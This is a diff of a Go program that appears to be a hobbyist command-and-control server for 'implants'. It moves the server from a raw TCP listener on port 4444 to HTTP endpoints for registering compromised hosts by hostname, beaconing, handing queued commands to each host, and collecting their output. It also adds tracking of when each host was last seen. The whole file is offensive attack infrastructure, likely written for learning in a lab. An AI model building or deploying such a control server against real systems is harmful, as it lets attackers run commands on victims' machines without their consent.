@@ -1,9 +1,10 @@
 package main
 
 import (
-	"bufio"
+	"fmt"
+	"io"
 	"log"
-	"net"
+	"net/http"
 	"strings"
 	"time"
 )
@@ -17,25 +18,62 @@ type Implant struct {
 
 var implants = make(map[string]*Implant)
 
-var lastSeen time.Time
+func hostnameHandler(w http.ResponseWriter, r *http.Request) {
+
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		log.Println("[-] Hostname Unknown")
+		return
+	}
+	hostname := strings.TrimSpace(string(body))
+
+	if _, exists := implants[hostname]; !exists { // looks up hostname checks if it exsists if it doesnt create new and store it
+		implants[hostname] = &Implant{}
+	}
+	implants[hostname].Hostname = hostname
+	implants[hostname].LastSeen = time.Now()
+	implants[hostname].Active = true
+	w.WriteHeader(http.StatusOK)
+
+}
+
+func beaconHandler(w http.ResponseWriter, r *http.Request) {
+	hostname := r.Header.Get("X-Hostname")
+	if hostname == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	if implants[hostname] == nil {
+		w.WriteHeader(http.StatusUnauthorized)
+		return
+	}
+	if implants[hostname].Command != "" {
+		fmt.Fprint(w, implants[hostname].Command)
+		implants[hostname].Command = ""
+	}
+
+	implants[hostname].LastSeen = time.Now()
+}
+
+func responseHandler(w http.ResponseWriter, r *http.Request) {
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		log.Println("[-] Response not received")
+		return
+	}
+
+	fmt.Println(string(body))
+	w.WriteHeader(http.StatusOK)
+	outputDone <- true
+
+}
 
 func initalizeServer() {
-	listen, err := net.Listen("tcp", ":4444")
-	if err != nil {
-		log.Fatal("[-] Error", err)
-	}
 
-	defer listen.Close()
-
-	for {
-		conn, err := listen.Accept()
-		if err != nil {
-			log.Println("[-] Error accepting connection")
-			continue
-		}
-
-		go handleImplants(conn)
-	}
+	http.HandleFunc("/hostname", hostnameHandler)
+	http.HandleFunc("/beacon", beaconHandler)
+	http.HandleFunc("/response", responseHandler)
+	http.ListenAndServe("192.168.1.151:8080", nil)
 }
 
 func checkImplantStatus() {
@@ -43,37 +81,11 @@ func checkImplantStatus() {
 	for {
 		time.Sleep(10 * time.Second)
 		for _, implant := range implants {
-			if time.Since(lastSeen) > 30*time.Second {
+			if time.Since(implant.LastSeen) > 30*time.Second {
 				implant.Active = false
 			} else {
 				implant.Active = true
 			}
 		}
-	}
-}
-
-func GetHostname(reader *bufio.Reader) string {
-	hostname, err := reader.ReadString('\n')
-	if err != nil {
-		return "unknown"
-	}
-	return strings.TrimSpace(hostname)
-
-}
-
-func handleImplants(conn net.Conn) {
-	defer conn.Close()
-	reader := bufio.NewReader(conn)
-	hostname := GetHostname(reader)
-	if _, exists := implants[hostname]; !exists { // looks up hostname checks if it exsists if it doesnt create new and store it
-		implants[hostname] = &Implant{}
-	}
-	implants[hostname].Hostname = hostname
-	implants[hostname].LastSeen = time.Now()
-	implants[hostname].Active = true
-	if implants[hostname].Command != "" {
-		sendCommands(conn, implants[hostname].Command)
-		implants[hostname].Command = ""
-		receiveOutput(reader)
 	}
 }
